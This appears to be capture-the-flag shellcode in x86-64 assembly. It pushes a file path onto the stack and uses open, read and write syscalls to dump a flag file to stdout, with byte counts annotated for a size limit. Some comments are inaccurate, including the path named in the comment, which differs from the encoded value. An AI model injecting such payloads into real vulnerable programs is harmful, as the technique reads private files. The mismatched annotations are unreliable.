global _start

section .text
_start:
    ; push './flg.txt\x00'
    xor rax, rax         ; 3 bytes (48 31 C0)
    push rax             ; 1 byte  (50)
    mov rdi, 0x7478742E6C662F2E  ; "./flg.txt" en hexadecimal (10 bytes)
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov rdi, rsp         ; 3 bytes (48 89 E7)
    
    mov al, 2            ; 2 bytes (B0 02) -> 'open' syscall
    xor rsi, rsi         ; 3 bytes (48 31 F6)
    syscall
    
    ; read file
    mov rdi, rax         ; 3 bytes (48 89 C7) -> fd devuelto por 'open'
    mov al, 0            ; 2 bytes (B0 00) -> 'read' syscall
    mov rsi, rsp         ; 3 bytes (48 89 E6)
    mov dl, 24           ; 2 bytes (B2 18)
    syscall
    
    ; write output
    mov rdi, 1           ; 2 bytes (BF 01)
    mov al, 1            ; 2 bytes (B0 01) -> 'write' syscall
    syscall

    ; exit retirado